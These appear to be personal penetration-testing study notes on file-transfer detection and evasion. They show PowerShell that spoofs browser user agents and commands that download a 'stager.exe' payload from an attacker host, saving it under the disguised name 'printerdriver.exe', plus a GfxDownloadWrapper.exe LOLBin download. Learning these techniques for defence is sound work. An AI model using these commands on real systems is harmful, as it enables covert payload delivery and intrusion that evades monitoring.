DETECTION
it is also quite easy to detect malicious file transfers from a servers point of view, as the user agent for these requests typically contain an artifact of whatever we used. These artifacts range from looking suspicious (to my untrained eye) to relatively normal, with the key giveaway ususally looking to be the file being downloaded or uploaded. This is something to be aware of in any work environments

Detection Evasion

its important to identify what services a company will use internally, like browsers, as this will allow us to meld our illegitemate traffic with their legitimate traffic by changing our user agent (with invoke-webrequest).

to list possible user agents:

POWERSHELL
PS C:\User>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

once we have identified the available user agents, we dont actually have to copy them in ourselves, we can just use a variable:

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::<Name of user agent as seen in previous commands output>

we can then simply do:

Invoke-WebRequest http://<attacker_ip>/stager.exe -UserAgent $UserAgent -Outfile "C:\Users\Public\printerdriver.exe

we can also use a LOLBin with a "misplaced trust" issue, like GfxDownloadWrapper.exe "http://<attacker_ip>/file.exe" "C:\Temp\safefiletrustme.exe"
